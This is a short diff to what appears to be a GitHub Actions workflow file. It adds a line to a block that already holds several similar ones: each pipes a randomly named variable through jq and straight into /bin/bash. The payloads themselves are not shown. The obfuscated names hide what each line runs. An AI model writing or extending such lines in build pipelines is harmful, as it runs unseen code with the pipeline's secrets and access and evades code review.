@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$j71419" | jq -r .x2113 | /bin/bash
           echo $svfgo153 | jq -r .p812 | /bin/bash
           echo $aztzr7 | jq -r .ur5289 | /bin/bash
+          echo $akrdp2 | jq -r .bdb12 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
